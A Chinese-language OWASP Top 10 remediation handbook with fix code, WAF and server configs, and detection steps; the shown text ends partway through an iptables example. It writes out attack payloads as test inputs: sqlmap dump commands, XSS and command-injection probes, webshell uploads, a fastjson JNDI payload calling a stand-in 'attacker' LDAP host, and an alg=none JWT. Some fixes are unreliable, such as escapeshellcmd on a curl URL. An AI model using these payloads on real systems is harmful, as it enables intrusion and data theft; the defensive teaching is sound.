# OWASP Top 10 漏洞修复手册

> 从防守方视角梳理 OWASP Top 10 的高频漏洞：攻击原理、检测点、修复方案。比赛靶机与日常业务代码排查通用，修复后配合 WAF 双保险。

## 一、SQL 注入

- **原理**：未过滤用户输入拼入 SQL 查询。
- **检测**：`grep -nE 'SELECT.*\$_|WHERE.*\$_|INSERT.*\$_' /var/www/html/`。
- **修复**：参数化查询（PDO prepare）、输入校验白名单、最小数据库权限、WAF 拦截注入特征（union/information_schema/sleep）。

## 二、XSS（存储/反射/DOM）

- **原理**：用户输入未转义直接输出到页面。
- **检测**：`grep -nE 'echo.*\$_|print.*\$_' /var/www/html/` 审查输出点。
- **修复**：输出转义（htmlspecialchars/模板引擎自动转义）、CSP 头、输入长度与字符白名单、HttpOnly Cookie。

## 三、文件上传漏洞

- **原理**：上传校验不严，恶意文件落入可执行目录。
- **检测**：审查上传接口，检查 `uploads/` 目录是否可执行脚本。
- **修复**：后缀白名单+内容（MIME）校验、随机重命名、上传目录禁执行、`.htaccess`/Nginx 规则拦截脚本后缀、限制文件大小。

## 四、命令注入 / RCE

- **原理**：用户输入拼入 shell 命令（system/exec/passthru）。
- **检测**：`grep -nE 'system\(|exec\(|shell_exec|passthru|popen\(' /var/www/html/`。
- **修复**：禁用危险函数（disable_functions）、命令参数白名单、输入校验、WAF 拦截 `;|&|$()|反引号`。

## 五、文件包含（LFI/RFI）

- **原理**：include 用户可控路径。
- **检测**：`grep -nE 'include.*\$_|require.*\$_' /var/www/html/`。
- **修复**：路径白名单、过滤 `../`、禁用 `allow_url_include`、WAF 拦截 `php://`/`../`/`expect://`。

## 六、SSRF

- **原理**：服务端请求用户可控 URL。
- **检测**：审查 URL 下载/代理类接口。
- **修复**：URL 白名单（协议+域名）、禁用内网网段、`open_basedir`/出网限制、WAF 拦截内网地址特征（127.0.0.1/169.254.169.254）。

## 七、反序列化漏洞

- **原理**：反序列化不可信数据，触发 gadget 链 RCE。
- **检测**：版本比对（Fastjson/Shiro/Log4j 等 CVE）、`grep -nE 'unserialize\(|readObject|json.parse' /var/www/html/`。
- **修复**：升级修复版本、禁用危险类、序列化白名单、WAF 拦截 `JNDI|rmi|ldap|com.sun.*` 特征。

## 八、弱口令 / 默认口令

- **原理**：默认口令或弱口令直接进后台。
- **检测**：见「弱口令与账号安全排查手册」。
- **修复**：强口令策略、强制改密、登录失败锁定、WAF/限速。

## 九、敏感信息泄露

- **原理**：源码/配置/日志暴露口令、密钥、内网信息。
- **检测**：`grep -rniE 'password|secret|api.?key|token' /var/www/html/ /etc/`。
- **修复**：配置外置并加密、禁止返回堆栈/版本信息、禁止 `.git/.env` 目录访问、日志脱敏。

## 十、越权访问 / 不安全的对象引用

- **原理**：仅前端隐藏，后端未校验权限，可遍历 ID 访问他人数据。
- **检测**：审查 `id=`/`uid=` 参数接口的后端鉴权。
- **修复**：后端强制权限校验、对象属主校验、接口频率限制。

## 通用修复落地

1. 代码层修复为主（参数化/转义/白名单），WAF 兜底。
2. 修复后逐项复测：注入/上传/XSS 用代表性 payload 打一遍，确认已拦。
3. 配合「中间件 CVE 速查手册」升级组件版本，消除已知漏洞。

## 补强篇：检测命令与修复代码全量示例（GUI / 无头双路径）

> 以下每条命令均可在 Linux shell 或 Windows PowerShell / CMD 直接复制运行。GUI 路径用于桌面环境手工复测；无头路径用于服务器批量巡检与 CI 流水线。

### A. SQL 注入

#### A.1 修复代码：PDO 参数化查询完整 PHP 示例

```php
<?php
// 安全写法：全程参数化，禁止字符串拼接 SQL
header('Content-Type: text/plain; charset=utf-8');

$host    = '127.0.0.1';
$db      = 'appdb';
$user    = 'app_user';        // 最小权限账号，仅授予 SELECT/INSERT/UPDATE
$pass    = getenv('DB_PASS'); // 密码走环境变量，不入库不入仓
$charset = 'utf8mb4';

$dsn = "mysql:host=$host;dbname=$db;charset=$charset";
$opt = [
    PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    PDO::ATTR_EMULATE_PREPARES   => false, // 关闭模拟预处理，强制服务端 prepare
];
$pdo = new PDO($dsn, $user, $pass, $opt);

// 命名占位符，输入永不拼进 SQL
$stmt = $pdo->prepare('SELECT id, username, email FROM users WHERE id = :id AND status = :status');
$stmt->execute([
    ':id'     => $_GET['id']     ?? 0,
    ':status' => $_GET['status'] ?? 1,
]);
foreach ($stmt as $row) {
    echo $row['username'], PHP_EOL;
}

// IN 子句也必须参数化，不能拼字符串
$ids = [1, 2, 3];
$in  = implode(',', array_fill(0, count($ids), '?'));
$stmt = $pdo->prepare("SELECT id FROM users WHERE id IN ($in)");
$stmt->execute($ids);
```

#### A.2 图形化检测

- Burp Suite Community：Proxy -> HTTP History 选中可疑请求（带 `id=1` 参数），右键 Send to Repeater；在 Repeater 中将参数改为 `id=1'` 观察是否报 SQL 错误；改为 `id=1 AND 1=1 -- ` 与 `id=1 AND 1=2 -- ` 比较响应长度差异。
- 浏览器开发者工具（F12 -> Network）：复现请求，查看 Response 中是否回显 MySQL/PostgreSQL 报错信息（如 `You have an error in your SQL syntax`）。
- SQLMap GUI（如 SQLiPy Burp 插件）：将 Burp 请求右键 Send to SQLiPy，自动调用 sqlmap 跑注入点。

#### A.3 无头服务器检测：sqlmap CLI

```bash
# 单点检测，自动判断注入类型
sqlmap -u "http://target.example.com/user.php?id=1" --batch --level=3 --risk=2

# 带 Cookie 的鉴权接口
sqlmap -u "http://target.example.com/api/order?oid=1001" \
  --cookie="PHPSESSID=abcdef0123456789" \
  --batch --dbs

# POST 表单注入
sqlmap -u "http://target.example.com/login.php" \
  --data="username=admin&password=123456" \
  --batch --technique=BEUSTQ

# 从 Burp 抓包文件批量检测
sqlmap -r /tmp/burp_request.txt --batch --level=5 --risk=3 --threads=4

# 拖库（仅授权测试）
sqlmap -u "http://target.example.com/user.php?id=1" -D appdb -T users --dump --batch
```

#### A.4 WAF 规则：ModSecurity SQL 注入拦截

```apache
# /etc/modsecurity/modsecurity.conf 启用 SecRuleEngine On
# /etc/modsecurity/rules/sql-injection.conf
SecRuleEngine On
SecDefaultAction "phase:2,deny,log,status:403"

# 拦截 union select / information_schema / sleep / benchmark 等典型特征
SecRule ARGS|ARGS_NAMES|REQUEST_URI "(?i)(union\s+select|information_schema|sleep\s*\(|benchmark\s*\(|load_file\s*\(|into\s+outfile|0x[0-9a-f]{8,})" \
    "id:1001,phase:2,deny,status:403,log,msg:'SQL Injection attempt',severity:CRITICAL"

# 拦截注释符与布尔盲注特征
SecRule ARGS "(?i)(--|/\*|\bor\b\s+1\s*=\s*1|\band\b\s+1\s*=\s*2)" \
    "id:1002,phase:2,deny,status:403,log,msg:'SQLi boolean/comment pattern'"
```

---

### B. XSS（跨站脚本）

#### B.1 修复代码：htmlspecialchars 完整用法

```php
<?php
// 输出到 HTML 上下文：转义 4 类字符，强制 UTF-8
echo htmlspecialchars($userInput, ENT_QUOTES | ENT_HTML5, 'UTF-8');

// 输出到 HTML 属性
echo '<input value="' . htmlspecialchars($val, ENT_QUOTES, 'UTF-8') . '">';

// 输出到 JavaScript 上下文（必须 JSON encode，不能只用 htmlspecialchars）
echo '<script>var cfg = ' . json_encode($userInput, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT) . ';</script>';

// 输出到 URL 参数
echo '<a href="/p?u=' . rawurlencode($userInput) . '">link</a>';
```

CSP 响应头（Nginx）：

```nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-Frame-Options "SAMEORIGIN" always;
```

#### B.2 图形化检测

- 浏览器 F12 -> Console：注入 `<img src=x onerror=alert(1)>` 后查看是否弹框。
- Burp Suite Repeater：在参数中插入 `"><script>alert(document.cookie)</script>`，观察响应是否原样回显。
- Chrome DevTools -> Sources -> Snippets：编写 DOM XSS 探测脚本批量测 sink（`innerHTML`、`document.write`、`eval`）。

#### B.3 无头服务器检测

```bash
# 反射型 XSS 快速探测（curl + grep）
curl -s "http://target.example.com/search?q=<script>alert(1)</script>" | grep -i "<script>alert(1)</script>"

# POST 表单
curl -s -X POST "http://target.example.com/comment" \
  -d "content=<svg/onload=alert(1)>" | grep -i "svg/onload"

# 检查响应头是否缺失 CSP / X-Frame-Options
curl -sI "http://target.example.com/" | grep -iE "content-security-policy|x-frame-options|x-content-type-options"

# 源码审计：grep echo/print 直接输出 $_GET/$_POST
grep -nE 'echo\s+.*\$_(GET|POST|REQUEST)|print\s+.*\$_(GET|POST|REQUEST)' /var/www/html/
```

#### B.4 Nginx 上传目录禁执行 location 块

```nginx
server {
    listen 80;
    server_name target.example.com;
    root /var/www/html;

    # 上传目录：禁止任何脚本被解析为 PHP
    location ^~ /uploads/ {
        # 允许的静态 MIME
        types { }
        default_type application/octet-stream;

        # 关键：禁止 PHP-FPM 处理
        location ~ \.(php|phtml|phar|php3|php4|php5|php7|phps)$ {
            deny all;
            return 403;
        }

        # 附加：禁止 .ht 类隐藏文件
        location ~ /\. {
            deny all;
        }
    }

    # 正常 PHP 解析仅限非上传目录
    location ~ \.php$ {
        # 防止目录穿越解析
        try_files $uri =404;
        fastcgi_pass unix:/run/php/php8.2-fpm.sock;
        fastcgi_index index.php;
        include fastcgi_params;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    }
}
```

#### B.5 .htaccess 完整示例（Apache）

```apache
# /var/www/html/uploads/.htaccess
# 禁止上传目录执行脚本
<FilesMatch "\.(php|phtml|phar|php3|php4|php5|php7|phps|cgi|pl|py|sh)$">
    Require all denied
</FilesMatch>

# 强制静态 MIME
ForceType application/octet-stream
AddType text/plain .html .htm

# 关闭服务器目录列表
Options -ExecCGI -Indexes

# 阻止 .ht 类文件被访问
<FilesMatch "^\.">
    Require all denied
</FilesMatch>
```

---

### C. 命令注入 / RCE

#### C.1 修复配置：PHP disable_functions 完整 ini 行

```ini
; /etc/php/8.2/fpm/php.ini  或  /etc/php/8.2/cli/php.ini
; 危险函数全部禁用，生产环境必备
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,pcntl_exec,pcntl_fork,putenv,getmyuid,getmygid,getmypid,dl,mail,imap_open,mb_send_mail,highlight_file,ini_restore,assert,symlink,link,chmod,chown,chgrp,mkdir,rmdir,rename,unlink,copy,umask,fopen,fsockopen,pfsockopen,dns_check_record,dns_get_record,gethostbyname,gethostbynamel,getmxrr,checkdnsrr
disable_classes = COM,WScript.Shell
```

#### C.2 修复代码：escapeshellarg / escapeshellcmd 用法

```php
<?php
// escapeshellarg：把单个参数转义为单引号字符串（推荐用于参数）
$file = $_POST['file'] ?? '';
$safe_file = escapeshellarg($file);
// 输出: 'somefile.txt' 或 'some'\''file.txt'
$out = shell_exec("file " . $safe_file);

// escapeshellcmd：转义整个命令中的元字符（仅当你必须拼接命令时使用）
$url = $_POST['url'] ?? '';
$safe_url = escapeshellcmd($url);
$out = shell_exec("curl -sS " . $safe_url);

// 最佳实践：用数组传参 + 不依赖 shell
$cmd = 'sha256sum';
$args = [$file];                       // 数组形式，参数自动隔离
$output = [];
$exit   = 0;
exec(escapeshellcmd($cmd) . ' ' . escapeshellarg($args[0]), $output, $exit);

// 真正安全：用 PHP 原生函数代替 shell
echo hash_file('sha256', $file);        // 推荐：根本不调用 shell
```

#### C.3 图形化检测

- Burp Suite Repeater：参数改为 `;id`、`|whoami`、`$(id)`、`` `id` ``、`&ver`（Windows），观察响应是否回显命令输出。
- 浏览器 F12 -> Network：在 URL 参数中尝试 `127.0.0.1;cat /etc/passwd` 等带外探测。

#### C.4 无头服务器检测

```bash
# 源码审计：找出所有 shell 调用
grep -nE 'system\s*\(|exec\s*\(|shell_exec\s*\(|passthru\s*\(|popen\s*\(|proc_open\s*\(|`\$_' /var/www/html/

# 远程探测带分号、管道、反引号的 payload
curl -s "http://target.example.com/ping.php?host=127.0.0.1;id" | grep -i "uid="
curl -s "http://target.example.com/ping.php?host=127.0.0.1%7Cwhoami" | grep -iE "root|www|daemon"

# Windows cmd 注入探测
curl -s "http://target.example.com/ping.aspx?host=127.0.0.1&ver" 

# 反向验证：disable_functions 是否生效
php -r "echo ini_get('disable_functions');" | tr ',' '\n' | grep -E '^(exec|system|passthru)$'
```

---

### D. 文件上传

#### D.1 修复配置：Nginx location ^~ /uploads/ 完整配置

```nginx
# 上传目录强制下载，禁止脚本解析
location ^~ /uploads/ {
    client_max_body_size 5m;                 # 限制上传体积
    client_body_timeout    30s;

    # 阻止任何脚本后缀被 PHP-FPM 处理
    location ~ \.(php|phtml|phar|php3|php4|php5|php7|phps|asp|aspx|jsp|cgi|pl|py|sh)$ {
        deny all;
        return 403;
    }

    # 禁止点开头的隐藏文件
    location ~ /\. {
        deny all;
    }

    # 关闭目录浏览
    autoindex off;

    # 强制静态 MIME
    default_type application/octet-stream;
}
```

#### D.2 修复配置：PHP open_basedir + allow_url_include

```ini
; /etc/php/8.2/fpm/php.ini
; 限制 PHP 文件访问范围，绕过也难逃目录树
open_basedir = /var/www/html/:/tmp/

; 禁止远程文件包含，杜绝 RFI
allow_url_include = Off
allow_url_fopen   = Off

; 上传相关
file_uploads       = On
upload_max_filesize = 2M
post_max_size       = 8M
upload_tmp_dir      = /tmp/php_upload
```

#### D.3 修复代码：PHP 上传白名单校验

```php
<?php
$allow = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
$ext   = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allow, true)) {
    http_response_code(403);
    exit('forbidden');
}

// 内容校验：用 finfo 校验真实 MIME
$finfo = new finfo(FILEINFO_MIME_TYPE);
$mime  = $finfo->file($_FILES['file']['tmp_name']);
$allowMime = ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'];
if (!in_array($mime, $allowMime, true)) {
    http_response_code(403);
    exit('forbidden');
}

// 随机重命名，避免覆盖与可执行后缀绕过
$name = bin2hex(random_bytes(16)) . '.' . $ext;
move_uploaded_file($_FILES['file']['tmp_name'], '/var/www/html/uploads/' . $name);
```

#### D.4 图形化检测

- Burp Suite：上传正常 jpg，Proxy 拦截请求，将 filename 改为 `shell.php`、`shell.phtml`、`shell.php.jpg`、`shell.php%00.jpg`，逐个 Repeater 重放观察是否返回可访问 URL。
- 浏览器 F12 -> Network：上传后查看返回 URL，手动访问确认是否触发解析。
- Windows：IIS Manager -> 站点 -> 请求筛选（Request Filtering）GUI 中查看是否禁用 `.php` 等后缀。

#### D.5 无头服务器检测

```bash
# 直接尝试上传可执行文件
curl -s -X POST "http://target.example.com/upload.php" \
  -F "file=@/tmp/shell.php;type=image/jpeg" \
  | grep -iE "uploads|\.php"

# 验证上传目录是否解析脚本
curl -sI "http://target.example.com/uploads/test.php" | head -1

# 服务器侧：审查上传目录是否残留可执行文件
find /var/www/html/uploads/ -type f \( -name "*.php" -o -name "*.phtml" -o -name "*.phar" \) 2>/dev/null

# Windows IIS 检查 web.config 中的请求过滤规则
type C:\inetpub\wwwroot\web.config | findstr /i "add fileExtensions"
```

#### D.6 Windows/IIS：web.config 请求过滤示例

```xml
<!-- C:\inetpub\wwwroot\web.config -->
<configuration>
  <system.webServer>
    <security>
      <requestFiltering>
        <fileExtensions allowUnlisted="true">
          <add fileExtension=".php" allowed="false" />
          <add fileExtension=".phtml" allowed="false" />
          <add fileExtension=".phar" allowed="false" />
          <add fileExtension=".asp" allowed="false" />
          <add fileExtension=".aspx" allowed="false" />
          <add fileExtension=".cer" allowed="false" />
          <add fileExtension=".cdx" allowed="false" />
        </fileExtensions>
        <hiddenSegments>
          <add segment="App_Data" />
          <add segment="bin" />
        </hiddenSegments>
        <requestLimits maxAllowedContentLength="5242880" />
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
```

---

### E. 反序列化漏洞

#### E.1 检测与升级命令：Maven 项目

```bash
# 列出项目中所有依赖，过滤 fastjson
mvn dependency:tree | grep -iE "fastjson|shiro|log4j|xstream|commons-collections|jackson-databind"

# 列出指定 groupId:artifactId 的版本
mvn dependency:tree -Dincludes=com.alibaba:fastjson

# 升级 fastjson 到安全版本（项目根目录执行）
mvn versions:use-latest-versions -Dincludes=com.alibaba:fastjson:1.2.83

# 升级 Log4j2 到修复版本
mvn versions:set -DnewVersion=2.17.1 -DprocessAllModules=true
mvn versions:commit

# 强制锁定版本（pom.xml 中显式声明覆盖传递依赖）
mvn versions:force-releases -Dincludes=org.apache.logging.log4j:log4j-core:2.17.1

# Gradle 等价命令
gradle dependencies --configuration compileClasspath | grep -i log4j
```

#### E.2 修复代码：Java 反序列化白名单

```java
// 使用 SerialKiller / fastjson safeMode
// fastjson 1.2.83+ 启用 safeMode（全局生效，关闭 autoType）
System.setProperty("fastjson.parser.safeMode", "true");
ParserConfig.getGlobalInstance().setSafeMode(true);

// Jackson 启用默认 typing 必须校验白名单
ObjectMapper mapper = new ObjectMapper();
mapper.activateDefaultTyping(
    BasicPolymorphicTypeValidator.builder()
        .allowIfSubType("com.example.domain.")
        .build(),
    ObjectMapper.DefaultTyping.NON_FINAL
);

// Java 原生 ObjectInputStream 重写白名单
public class SafeObjectInputStream extends ObjectInputStream {
    private static final Set<String> ALLOW = Set.of(
        "java.lang.String", "java.lang.Number", "java.util.ArrayList"
    );
    public SafeObjectInputStream(InputStream in) throws IOException { super(in); }
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc)
            throws IOException, ClassNotFoundException {
        if (!ALLOW.contains(desc.getName())) {
            throw new InvalidClassException("Unauthorized deserialization", desc.getName());
        }
        return super.resolveClass(desc);
    }
}
```

#### E.3 图形化检测

- Docker Desktop -> Images -> 选中镜像 -> Inspect，查看基础镜像是否包含已修复的 JVM/JDK。
- Burp Suite：拦截 Java 序列化请求体（开头为 `AC ED 00 05` 或 Base64 后 `rO0AB`），在 Repeater 中替换为 ysoserial 生成的 payload。
- IntelliJ IDEA：Maven 面板 -> Show Dependencies，可视化搜索 fastjson/log4j 版本。
- Docker 镜像扫描 GUI：Docker Scout、Snyk Desktop、Trivy VS Code 插件。

#### E.4 无头服务器检测

```bash
# 源码审计
grep -nE 'unserialize\s*\(|readObject\s*\(|JSON\.parseObject|ObjectInputStream' /var/www/html/ /opt/app/src/

# 服务端 Java 项目依赖扫描
mvn -f /opt/app/pom.xml dependency:tree | grep -iE "fastjson|shiro|log4j|xstream|commons-collections"

# 检测 Java 进程加载的 fastjson 版本（运行时）
jcmd $(pgrep -f 'java.*app') VM.classloader | grep -i fastjson

# 服务端响应中检测 Java 报错回显（典型反序列化触发）
curl -s "http://target.example.com/api" -H "Content-Type: application/json" \
  -d '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}' \
  | grep -iE "exception|jndi|rmi"

# 全量镜像扫描（CI 友好）
trivy image --scanners vuln --severity HIGH,CRITICAL app:latest
trivy fs --scanners vuln /opt/app/
```

---

### F. 失效访问控制

#### F.1 Apache 后台路径 Basic Auth 完整配置

```apache
# /etc/apache2/sites-enabled/target.conf
<VirtualHost *:443>
    ServerName target.example.com
    DocumentRoot /var/www/html

    Alias /admin /var/www/html/admin

    <Directory /var/www/html/admin>
        AuthType Basic
        AuthName "Restricted Admin Area"
        AuthUserFile /etc/apache2/.htpasswd-admin
        AuthGroupFile /dev/null
        Require valid-user

        # 仅允许公司内网
        Require ip 10.0.0.0/8 192.168.0.0/16

        # 强制 HTTPS
        SSLRequireSSL
    </Directory>
</VirtualHost>

# 生成密码文件
htpasswd -c /etc/apache2/.htpasswd-admin admin
htpasswd /etc/apache2/.htpasswd-admin ops
```

#### F.2 Nginx 后台路径 Basic Auth 完整配置

```nginx
server {
    listen 443 ssl http2;
    server_name target.example.com;
    root /var/www/html;

    location /admin/ {
        auth_basic           "Restricted Admin Area";
        auth_basic_user_file /etc/nginx/.htpasswd-admin;

        # 仅允许内网
        allow 10.0.0.0/8;
        allow 192.168.0.0/16;
        deny  all;

        # 强制 HTTPS（如已配 SSL 则天然满足）
        if ($scheme = http) { return 301 https://$host$request_uri; }

        try_files $uri $uri/ /admin/index.php?$args;
    }
}
```

```bash
# 生成 Nginx 密码文件（与 Apache 同格式）
htpasswd -c /etc/nginx/.htpasswd-admin admin
htpasswd      /etc/nginx/.htpasswd-admin ops
# 重载配置
nginx -t && systemctl reload nginx
```

#### F.3 JWT 验证示例（PHP）

```php
<?php
// composer require firebase/php-jwt
require 'vendor/autoload.php';
use Firebase\JWT\JWT;
use Firebase\JWT\Key;

$secret = getenv('JWT_SECRET'); // 强制 HS256 + 长随机串

function require_auth(): object {
    $hdr = $_SERVER['HTTP_AUTHORIZATION'] ?? '';
    if (!preg_match('/^Bearer\s+(.+)$/i', $hdr, $m)) {
        http_response_code(401);
        exit('unauthorized');
    }
    try {
        // 关键：指定算法 Key，杜绝 alg=none 攻击
        $decoded = JWT::decode($m[1], new Key(getenv('JWT_SECRET'), 'HS256'));
    } catch (Throwable $e) {
        http_response_code(401);
        exit('invalid token');
    }

    // 关键：业务侧再次校验角色与资源归属（防越权）
    if (($decoded->role ?? '') !== 'admin') {
        http_response_code(403);
        exit('forbidden');
    }
    return $decoded;
}

$ctx = require_auth();
echo "welcome admin: ", $ctx->sub;
```

#### F.4 图形化检测

- Burp Suite：登录普通用户，Proxy 拦截 `/api/order/1001`，将 `id` 改为 `1002`，Repeater 重放看是否能取到他人订单。
- Burp Suite Repeater：将 Authorization 头改为 `Bearer <空>` 或 `Bearer eyJhbGciOiJub25lIn0..`（alg=none 测试），观察是否绕过。
- 浏览器 F12 -> Application -> Cookies：观察 JWT 是否设置 HttpOnly、Secure、SameSite。

#### F.5 无头服务器检测

```bash
# 越权探测：未登录直接访问后台
curl -sI "http://target.example.com/admin/index.php" | head -1

# 越权探测：水平越权 id 遍历
for i in 1001 1002 1003; do
  curl -s "http://target.example.com/api/order/$i" -H "Cookie: PHPSESSID=lowpriv" | head -c 200; echo
done

# JWT alg=none 攻击测试
curl -s "http://target.example.com/api/me" \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9." \
  | head -c 200

# 服务端审计：检查代码是否缺失权限校验
grep -rnE '\$_GET\[.id.\]|\$_GET\[.uid.\]' /var/www/html/ | head -20

# Windows IIS 后台保护检查
%windir%\system32\inetsrv\appcmd list config /section:basicAuthentication
```

#### F.6 Windows/IIS：web.config 后台 Basic Auth

```xml
<configuration>
  <system.webServer>
    <security>
      <authentication>
        <anonymousAuthentication enabled="false" />
        <basicAuthentication enabled="true"
                             defaultLogonDomain="EXAMPLE"
                             realm="Admin Area" />
      </authentication>
      <authorization>
        <add accessType="Deny" users="?" />
      </authorization>
      <ipSecurity allowUnlisted="false">
        <add ipAddress="10.0.0.0" subnetMask="255.0.0.0" allowed="true" />
        <add ipAddress="192.168.0.0" subnetMask="255.255.0.0" allowed="true" />
      </ipSecurity>
    </security>
  </system.webServer>
</configuration>
```

```powershell
# 启用 Basic Auth 模块
Install-WindowsFeature Web-Basic-Auth
# 应用配置
iisreset
```

---

### G. 安全误配置

#### G.1 php.ini 完整安全配置段

```ini
; /etc/php/8.2/fpm/php.ini
; ===== 错误与版本信息 =====
display_errors          = Off
display_startup_errors  = Off
log_errors              = On
error_log               = /var/log/php/error.log
error_reporting         = E_ALL & ~E_DEPRECATED & ~E_STRICT
expose_php              = Off

; ===== Session =====
session.cookie_httponly = 1
session.cookie_secure   = 1
session.cookie_samesite = Strict
session.use_strict_mode = 1
session.use_only_cookies = 1
session.gc_maxlifetime  = 1440

; ===== 文件与包含 =====
open_basedir            = /var/www/html/:/tmp/
allow_url_include       = Off
allow_url_fopen         = Off
file_uploads            = On
upload_max_filesize     = 2M
post_max_size           = 8M
upload_tmp_dir          = /tmp/php_upload

; ===== 命令与危险函数 =====
disable_functions       = exec,passthru,shell_exec,system,proc_open,popen,curl_multi_exec,parse_ini_file,show_source,pcntl_exec,putenv
disable_classes         = COM,WScript.Shell

; ===== 资源限制（防 DoS） =====
max_execution_time      = 30
max_input_time          = 30
memory_limit            = 128M

; ===== 杂项 =====
expose_php              = Off
cgi.fix_pathinfo        = 0
session.serialize_handler = php_serialize
```

#### G.2 Nginx 隐藏版本号与安全响应头

```nginx
server_tokens off;          # 隐藏 Nginx 版本

# 全站安全响应头
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
add_header Content-Security-Policy "default-src 'self'" always;
add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;

# 禁止访问敏感文件
location ~ /\.(git|env|htaccess|htpasswd) { deny all; return 404; }
location ~ /(composer\.(json|lock)|package(-lock)?\.json|wp-config\.php)$ { deny all; return 404; }
```

#### G.3 图形化检测

- 浏览器 F12 -> Network -> 选中主请求 -> Response Headers，查看 `Server`、`X-Powered-By`、`Set-Cookie` 是否泄露版本或缺失 HttpOnly/Secure。
- Burp Suite -> Target -> Site map，查看响应头矩阵。
- Docker Desktop / Portainer GUI：查看容器是否以 root 运行、是否暴露调试端口。

#### G.4 无头服务器检测

```bash
# 检测响应头中的版本信息泄露
curl -sI "http://target.example.com/" | grep -iE "^server:|^x-powered-by:"

# 检测 Cookie 安全标志
curl -sI "http://target.example.com/login.php" | grep -i "set-cookie"
curl -sI "http://target.example.com/" | grep -iE "httponly|secure|samesite"

# 服务端配置审计
php -r "echo ini_get('expose_php'), PHP_EOL, ini_get('display_errors');"
grep -E '^(expose_php|display_errors|allow_url_include|open_basedir|session\.cookie_)' /etc/php/8.2/fpm/php.ini

# Nginx 版本隐藏检查
curl -sI "http://target.example.com/" | grep -i "^server:"
nginx -V 2>&1 | head -1

# Windows IIS 版本与请求过滤检查
appcmd list config /section:serverRuntime
appcmd list config /section:requestFiltering
```

#### G.5 Windows/IIS 隐藏服务器头

```xml
<!-- C:\inetpub\wwwroot\web.config -->
<configuration>
  <system.webServer>
    <httpProtocol>
      <customHeaders>
        <remove name="X-Powered-By" />
        <add name="X-Frame-Options" value="SAMEORIGIN" />
        <add name="X-Content-Type-Options" value="nosniff" />
        <add name="Strict-Transport-Security" value="max-age=31536000; includeSubDomains" />
      </customHeaders>
    </httpProtocol>
    <security>
      <requestFiltering removeServerHeader="true">
        <fileExtensions>
          <add fileExtension=".config" allowed="false" />
          <add fileExtension=".bak" allowed="false" />
          <add fileExtension=".sql" allowed="false" />
        </fileExtensions>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
```

```powershell
# IIS 隐藏 Server 头（需 URL Rewrite 模块）
Install-Module -Name IISAdministration
# 或注册表方式
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\HTTP\Parameters" -Name "DisableServerHeader" -Value 1
iisreset
```

---

### H. SSRF（服务端请求伪造）

#### H.1 修复代码：PHP curl 防 SSRF（白名单 + 禁止内网 IP）

```php
<?php
function safe_curl(string $url): string {
    // 1. 协议白名单
    $scheme = strtolower(parse_url($url, PHP_URL_SCHEME) ?? '');
    if (!in_array($scheme, ['http', 'https'], true)) {
        throw new RuntimeException("forbidden scheme: $scheme");
    }

    // 2. 域名白名单
    $host = strtolower(parse_url($url, PHP_URL_HOST) ?? '');
    $allowHosts = ['api.partner-a.com', 'api.partner-b.com'];
    if (!in_array($host, $allowHosts, true)) {
        throw new RuntimeException("forbidden host: $host");
    }

    // 3. DNS 解析后再次校验 IP，防止 DNS rebinding
    $ip = gethostbyname($host);
    if ($ip === $host) {
        throw new RuntimeException("dns resolve failed");
    }
    if (is_private_ip($ip)) {
        throw new RuntimeException("internal ip blocked: $ip");
    }

    // 4. curl 强制解析到该校验后的 IP，禁止重定向到内网
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => false,           // 禁止跟随 Location 到内网
        CURLOPT_MAXREDIRS      => 0,
        CURLOPT_CONNECTTIMEOUT => 5,
        CURLOPT_TIMEOUT        => 10,
        CURLOPT_RESOLVE        => ["$host:443:$ip", "$host:80:$ip"],
        CURLOPT_PROTOCOLS      => CURLPROTO_HTTP | CURLPROTO_HTTPS,
        CURLOPT_REDIR_PROTOCOLS => 0,
    ]);
    $body = curl_exec($ch);
    if (curl_errno($ch)) {
        throw new RuntimeException('curl error: ' . curl_error($ch));
    }
    curl_close($ch);
    return $body;
}

function is_private_ip(string $ip): bool {
    $private = [
        '10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16',
        '127.0.0.0/8', '169.254.0.0/16', '0.0.0.0/8',
        '100.64.0.0/10',                          // CGNAT
        'fc00::/7', '::1',                         // IPv6 私有与回环
        'fe80::/10',                               // link-local
    ];
    $long = ip2long($ip);
    if ($long === false) {
        // IPv6 用字符串前缀比较
        foreach (['fc', 'fd', 'fe8', 'fe9', 'fea', 'feb', '::1'] as $p) {
            if (str_starts_with(strtolower($ip), $p)) return true;
        }
        return false;
    }
    foreach ($private as $cidr) {
        [$net, $mask] = explode('/', $cidr);
        if (ip2long($net) === false) continue;
        $maskLong = -1 << (32 - (int)$mask);
        if (($long & $maskLong) === (ip2long($net) & $maskLong)) {
            return true;
        }
    }
    return false;
}

echo safe_curl($_GET['url'] ?? '');
```

#### H.2 iptables 出站限制命令

```bash
# 仅允许 Web 服务器出站到合作方 API，禁止访问内网网段
# 1. 禁止出站到内网（防止 SSRF 探测内网）
iptables -A OUTPUT -d 10.0.0.0/8      -j DROP
